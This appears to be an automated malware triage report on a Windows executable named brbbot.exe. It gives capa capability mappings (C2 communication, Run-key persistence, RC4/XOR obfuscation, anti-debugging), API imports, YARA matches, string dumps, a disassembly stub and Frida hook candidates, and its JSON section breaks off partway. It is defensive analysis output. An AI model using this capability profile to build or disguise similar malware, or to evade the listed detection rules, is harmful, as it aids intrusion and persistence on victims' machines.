| ResourceName | 91224 |
| Resources.CONFIG.101.en-us.Data | 91248 |
| Relocations | 95232 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 35 · duration_s: 1.13

| Rule | ATT&CK | MBC |
|---|---|---|
| encode data using XOR | T1027:Obfuscated Files or Information | E1027.m02:Obfuscated Files or Information, C0026.002:Encode Data |
| encrypt or decrypt via WinCrypt | T1027:Obfuscated Files or Information | C0031:Decrypt Data, C0027:Encrypt Data |
| encrypt data using RC4 via WinAPI | T1027:Obfuscated Files or Information | E1027.m05:Obfuscated Files or Information, C0027.009:Encrypt Data |
| create new key via CryptAcquireContext | T1027:Obfuscated Files or Information | C0028:Encryption Key |
| query environment variable | T1082:System Information Discovery | E1082:System Information Discovery |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| get file size | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| get hostname | T1082:System Information Discovery | E1082:System Information Discovery |
| delete registry value | T1112:Modify Registry | C0036.007:Registry |
| persist via Run registry key | T1547.001:Boot or Logon Autostart Execution | F0012:Registry Run Keys / Startup Folder |
| receive data |  | B0030.002:C2 Communication |
| send data |  | B0030.001:C2 Communication |
| write and execute a file |  | B0023:Install Additional Program |
| resolve DNS |  | C0011.001:DNS Communication |
| check HTTP status code |  | C0002.014:HTTP Communication |

## PE Imports / Signals
import_count: 115

| label | api_match | ATT&CK |
|---|---|---|
| check_debugger | IsDebuggerPresent | T1622 |
| crypto_encrypt | CryptEncrypt | T1573 |
| http_client | InternetOpen | T1071.001 |
| set_registry_value | RegSetValue | T1112 |
| create_process | CreateProcess | T1106 |
| load_library | LoadLibrary | T1129 |
| get_proc_address | GetProcAddress | T1129 |

## YARA Matches (pipeline)
Total matches: 17

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| contains_base64 | - | $a@4117 len=12 |
| Dropper_Strings | - | $a0@59035 len=18 |
| Advapi_Hash_API | - | $advapi32@63816 len=12; $CryptCreateHash@63730 len=15; $CryptHashData@63802 len=13; $CryptAcquireContext@63650 len=19 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasRichSignature | - | $a0@208 len=4 |
| Microsoft_Visual_Cpp_80_DLL | - | $b@13204 len=4 |
| anti_dbg | - | $d1@64588 len=12; $c2@64758 len=17 |
| network_http | - | $f1@64018 len=11; $c1@63922 len=15; $c2@64004 len=12; $c4@63862 len=16; $c6@63964 len=15; $c7@63984 len=15 |
| screenshot | - | $d2@64610 len=10; $c2@64604 len=5 |
| win_registry | - | $f1@63816 len=12; $c2@63588 len=13; $c3@63636 len=11; $c4@63570 len=14; $c6@63636 len=11 |
| win_files_operation | - | $f1@64588 len=12; $c1@64132 len=9; $c2@65400 len=14; $c3@64132 len=9; $c4@63870 len=8; $c5@64474 len=11; $c6@64044 len=11 |
| Str_Win32_Winsock2_Library | - | $ws2_lib@64030 len=10 |
| Str_Win32_Wininet_Library | - | $wininet_lib@64018 len=11 |
| Str_Win32_Internet_API | - | $wininet_call_closeh@63882 len=19; $wininet_call_readf@63862 len=16; $wininet_call_connect@63922 len=15; $wininet_call_open@64004 len=12 |
| Str_Win32_Http_API | - | $wininet_call_httpr@63984 len=15; $wininet_call_httpq@63904 len=13; $wininet_call_httpo@63964 len=15 |

## Generated YARA Meta
```json
{
  "rule_count": 17,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$a",
          "offset": 4117,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Dropper_Strings",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$a0",
          "offset": 59035,
          "length": 18,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Advapi_Hash_API",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$advapi32",
          "offset": 63816,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$CryptCreateHash",
          "offset": 63730,
          "length": 15,
          "xor_key": null
        },
        {
          "id": "$CryptHashData",
          "offset": 63802,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$CryptAcquireContext",
          "offset": 63650,
          "length": 19,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": []
    },
    {
      "rule": "HasRichSignature",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$a0",
          "offset": 208,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Microsoft_Visual_Cpp_80_DLL",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$b",
          "offset": 13204,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "anti_dbg",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$d1",
          "offset": 64588,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 64758,
          "length": 17,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "network_http",
      "path": "/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe",
      "strings": [
        {
          "id": "$f1",
          "offset": 64018,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c1",
          "offset": 63922,
          "length": 15,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 64004,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 63862,
          "length": 16,
          "xor_key": null
        },
        {
          "id": "$c6",
          "offset": 63964,
          "length": 15,
          "xor_key": null
        },
        {
          "id": "$c7",
          "offset": 63984,
          "length": 15,
          "x
```

## FLOSS Strings
Total strings: 310 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 310}`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.rdata`
- `@.data`
- `.pdata`
- `@.rsrc`
- `@.reloc`
- `WATAUH`
- `USVATH`
- `xA\^[]`
- `UVATAVAWH`
- `\$ D9d$x`
- `0A_A^A\^]`
- `\$ UVWATAUAVAWH`
- `A_A^A]A\_^]`
- `UVWATAUAVAWH`
- `|$ H9=`
- `@SATAUH`
- `@A]A\[`
- `\$ UVATAUAWH`
- `D9&t3H`
- `A_A]A\^]`
- `L$ USWH`
- `D8D$0u9D`
- `D9D$`t`
- `D$<D9D$`t`
- `D)\$4A;`
- `t$\D9D$`t`
- `t$\D8D$@t`
- `D8D$0u`
- `t$4D8D$8t`
- `|$ UATAUAVAWH`
- `A_A^A]A\]`
- `D$DD9T$\`
- `t$hD+d$DD+`
- `9D$Pti`
- `UVWATAUH`
- `D$&8\$&t-8X`
- `@A]A\_^]`
- `WATAUAVAWH`
- `@A_A^A]A\_`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x140003f94
```asm
┌ 401: entry0 ();
│       ╎   ; var int64_t var_20h @ rsp+0x20
│       ╎   ; var int64_t var_30h @ rsp+0x30
│       ╎   ; var int64_t var_6ch @ rsp+0x6c
│       ╎   ; var int64_t var_70h @ rsp+0x70
│       ╎   ; var int64_t var_b0h @ rsp+0xb0
│       ╎   ; var int64_t var_10h @ rsp+0xb8
│       ╎   0x140003f94      4883ec28       sub rsp, 0x28
│       ╎   0x140003f98      e8f7490000     call 0x140008994
│       ╎   0x140003f9d      4883c428       add rsp, 0x28
│       └─< 0x140003fa1      e952feffff     jmp 0x140003df8
..
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 000000E8 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `ADVAPI32.dll!RegSetValueExA`
  - `ADVAPI32.dll!RegOpenKeyExA`
  - `ADVAPI32.dll!RegDeleteValueA`
  - `ADVAPI32.dll!RegFlushKey`
  - `ADVAPI32.dll!RegCloseKey`
  - `WININET.dll!HttpSendRequestA`
  - `WININET.dll!InternetQueryDataAvailable`
  - `WININET.dll!InternetReadFile`
  - `WININET.dll!InternetCloseHandle`
  - `WININET.dll!HttpQueryInfoA`
  - `WS2_32.dll!gethostbyname`
  - `WS2_32.dll!WSACleanup`
  - `WS2_32.dll!WSAStartup`
  - `WS2_32.dll!inet_ntoa`
  - `WS2_32.dll!gethostname`
  - `KERNEL32.dll!CreateFileW`
  - `KERNEL32.dll!HeapSize`
  - `KERNEL32.dll!WriteConsoleW`
  - `KERNEL32.dll!SetStdHandle`
  - `KERNEL32.dll!LoadLibraryW`
  - `USER32.dll!GetDC`
